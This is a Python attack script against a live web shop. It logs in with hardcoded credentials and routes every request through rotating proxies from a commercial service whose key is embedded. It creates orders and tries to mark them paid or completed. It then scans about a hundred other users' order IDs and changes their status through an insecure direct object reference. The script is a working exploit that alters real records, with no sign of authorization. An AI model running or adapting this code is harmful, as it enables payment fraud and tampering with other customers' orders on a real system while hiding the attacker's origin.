#!/usr/bin/env python3
"""Fenzhan IDOR: authenticated change/orders with p4764923 — enumerate own orders + IDOR."""
import json
import subprocess
import time
import urllib.parse
from datetime import datetime
from pathlib import Path

BASE = "https://qq1.lol"
OUT = Path("/tmp/qq1_deep9")
LOG = OUT / "idor.log"
HITS = OUT / "hits.jsonl"
JAR = str(OUT / "idor.jar")
QG, PW = "C413ED6D", "344F550A6F8B"
USER, PASS = "p4764923", "Test64923x"
_px = None


def log(m):
    line = f"[{datetime.now():%H:%M:%S}] {m}"
    print(line, flush=True)
    open(LOG, "a").write(line + "\n")


def hit(kind, detail, body=""):
    open(HITS, "a").write(json.dumps({"kind": kind, "detail": detail, "body": (body or "")[:8000]}, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:350]}")


def fresh():
    global _px
    for area in ("440000", "0"):
        try:
            d = json.loads(subprocess.check_output(
                ["curl", "-s", "--max-time", "10", f"https://share.proxy.qg.net/query?key={QG}"],
                text=True, timeout=12))
            if d.get("code") != "SUCCESS" or not d.get("data"):
                d = json.loads(subprocess.check_output(
                    ["curl", "-s", f"https://share.proxy.qg.net/get?key={QG}&num=1&area={area}"],
                    text=True, timeout=12))
            for x in d.get("data") or []:
                cand = f"http://{QG}:{PW}@{x['server']}"
                code = subprocess.run(
                    ["curl", "-sk", "--max-time", "10", "-x", cand, "-o", "/tmp/t9.out",
                     "-w", "%{http_code}", f"{BASE}/%61pi.php?act=siteinfo"],
                    capture_output=True, text=True, timeout=14).stdout.strip()
                if code == "200" and b"sitename" in open("/tmp/t9.out", "rb").read():
                    _px = cand
                    log(f"px {x['server']}")
                    return _px
        except Exception as e:
            log(f"px {e}")
        time.sleep(0.5)
    return _px


def curl(url, post=None, mt=18):
    global _px
    if not _px:
        fresh()
    for _ in range(4):
        cmd = ["curl", "-sk", "--max-time", str(mt), "-x", _px, "-b", JAR, "-c", JAR,
               "-A", "Mozilla/5.0", "-H", "Referer: https://qq1.lol/",
               "-H", "X-Requested-With: XMLHttpRequest",
               "-w", "\n__HTTP:%{http_code}"]
        if post is not None:
            body = urllib.parse.urlencode(post) if isinstance(post, dict) else str(post)
            cmd += ["-X", "POST", "--data-binary", body,
                    "-H", "Content-Type: application/x-www-form-urlencoded"]
        cmd.append(url)
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=mt + 6).stdout or ""
        if "authorization expired" in out or "__HTTP:" not in out:
            fresh(); continue
        b, code = out.rsplit("__HTTP:", 1)
        return b.strip(), code.strip()
    return "", "000"


def main():
    open(LOG, "w").write("")
    log("=== FENZHAN IDOR ===")
    fresh()

    # list orders for various tids
    for tid in ["", "4", "118", "83", "102", "1", "2", "3", "5", "10", "11", "103", "104", "160"]:
        post = {"user": USER, "pass": PASS, "limit": "20"}
        url = f"{BASE}/%61pi.php?act=orders&limit=20"
        if tid:
            url += f"&tid={tid}"
            post["tid"] = tid
        b, c = curl(url, post)
        log(f"orders tid={tid or 'ALL'}: {c} {(b or '')[:250]}")
        if b and b.strip() not in ("[]", "null") and "不正确" not in b and "NEEDAUTH" not in b and "请提供" not in b:
            if b.startswith("[") or '"id"' in b or "input" in b:
                hit("orders_data", f"tid={tid}", b)
        time.sleep(0.25)

    # search
    for q in ["26107", "26100", "1", USER, "123456789"]:
        b, c = curl(f"{BASE}/%61pi.php?act=search", {"user": USER, "pass": PASS, "id": q, "qq": q})
        log(f"search {q}: {c} {(b or '')[:200]}")
        if b and "不正确" not in b and "不存在" not in b and "NEEDAUTH" not in b:
            if '"id"' in b or "成功" in b or b.startswith("["):
                hit("search_data", q, b)
        time.sleep(0.2)

    # create order via API pay as fenzhan
    log("=== API PAY AS FENZHAN ===")
    for tid in ("4", "118", "83"):
        b, c = curl(f"{BASE}/%61pi.php?act=pay", {
            "user": USER, "pass": PASS, "tid": tid, "num": "1",
            "input1": "idor@" + USER, "inputvalue": "idor@" + USER,
        })
        log(f"api pay tid={tid}: {c} {(b or '')[:250]}")
        if b and ("trade_no" in b or '"code":0' in b or '"code":1' in b):
            hit("api_pay", tid, b)
            try:
                j = json.loads(b)
            except Exception:
                j = {}
            oid = j.get("id") or j.get("orderid")
            tn = j.get("trade_no")
            # try mark paid / completed on our order
            if oid:
                for zt in ("1", "2", "4"):
                    b2, c2 = curl(f"{BASE}/%61pi.php?act=change&id={oid}&zt={zt}",
                                  {"user": USER, "pass": PASS})
                    log(f"  change own id={oid} zt={zt}: {c2} {(b2 or '')[:200]}")
                    if b2 and "成功" in b2:
                        hit("change_own", f"{oid}/{zt}", b2)
            if tn:
                # try query
                b3, c3 = curl(BASE + "/ajax.php?act=query", {"type": "1", "qq": "123456789", "page": "1"})
                log(f"  query after pay: {c3} {(b3 or '')[:250]}")
        time.sleep(0.3)

    # IDOR: probe recent order IDs with change (read-ish via error msgs) and zt=2 (non-destructive-ish)
    # Use zt that won't mark paid - try zt=2 processing first; if 成功 that's IDOR
    log("=== IDOR change scan recent ids ===")
    # current orders ~26107
    start = 26110
    ids = list(range(start, start - 80, -1)) + list(range(1, 30)) + [100, 500, 1000, 5000, 10000, 20000, 25000]
    success = 0
    for oid in ids:
        # zt=2 处理中 — less harmful than marking paid; still log if成功
        b, c = curl(f"{BASE}/%61pi.php?act=change&id={oid}&zt=2", {"user": USER, "pass": PASS})
        short = (b or "")[:120]
        if "成功" in (b or ""):
            hit("IDOR_CHANGE", f"id={oid}", b)
            success += 1
        elif "无权" not in (b or "") and "不存在" not in (b or "") and "不正确" not in (b or ""):
            log(f"  odd id={oid}: {c} {short}")
        if oid % 20 == 0:
            log(f"  progress id={oid} last={short}")
        time.sleep(0.18)

    log(f"=== IDOR DONE success_changes={success} ===")


if __name__ == "__main__":
    main()
